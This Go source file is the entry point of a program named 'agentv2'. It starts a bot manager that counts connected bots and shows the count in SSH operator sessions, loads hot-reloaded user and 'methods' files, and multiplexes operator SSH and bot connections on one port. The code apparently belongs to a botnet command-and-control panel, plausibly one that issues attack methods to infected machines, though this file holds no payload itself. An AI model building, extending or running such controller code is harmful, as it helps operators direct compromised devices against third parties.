package main

import (
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"

	"agentv2/pkg/arguments"
	"agentv2/pkg/commands"
	"agentv2/pkg/config"
	"agentv2/pkg/master"
	"agentv2/pkg/multiplexer"
	"agentv2/pkg/terminal"
)

func main() {
	args := arguments.Parse()

	// Locate config files: prioritize current dir, then exe dir, then fallback to root parent dir
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)

	usersFile := resolvePath(args.UsersFile, exeDir)
	methodsFile := resolvePath(args.MethodsFile, exeDir)

	cfgMgr := config.NewConfigManager(usersFile, methodsFile)
	if err := cfgMgr.LoadAll(); err != nil {
		fmt.Printf("[!] Error loading config: %v\n", err)
	}
	cfgMgr.StartWatcher()

	var sshServer *terminal.SshServer

	// Bot Manager
	botMgr := master.NewBotManager(func(count int64) {
		if sshServer != nil {
			sshServer.UpdateBotCountTitle(count)
		}
	})

	// Command Handler
	cmdHandler := commands.NewCommandHandler(cfgMgr, botMgr)

	// SSH Server
	var err error
	sshServer, err = terminal.NewSshServer(cfgMgr, botMgr, cmdHandler)
	if err != nil {
		fmt.Printf("[!] Failed to initialize SSH server: %v\n", err)
		os.Exit(1)
	}

	internalSSHPort, err := sshServer.StartInternal()
	if err != nil {
		fmt.Printf("[!] Failed to start internal SSH server: %v\n", err)
		os.Exit(1)
	}

	// Listen for config changes and notify active SSH sessions
	go func() {
		for msg := range cfgMgr.NotifyChan() {
			sshServer.BroadcastNotice(msg)
		}
	}()

	// Multiplexer on unified port
	mux := multiplexer.NewMultiplexer(args.Port, internalSSHPort, botMgr)
	if err := mux.Start(); err != nil {
		fmt.Printf("[!] Failed to start unified multiplexer: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] Press Ctrl+C to stop.")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	<-sigChan

	fmt.Println("\r[!] Shutting down agentv2...")
	mux.Stop()
	_ = sshServer.Close()
	fmt.Println("[+] Shutdown complete.")
}

func resolvePath(path, exeDir string) string {
	if _, err := os.Stat(path); err == nil {
		return path
	}
	candExe := filepath.Join(exeDir, path)
	if _, err := os.Stat(candExe); err == nil {
		return candExe
	}
	candParent := filepath.Join("..", path)
	if _, err := os.Stat(candParent); err == nil {
		return candParent
	}
	return path
}
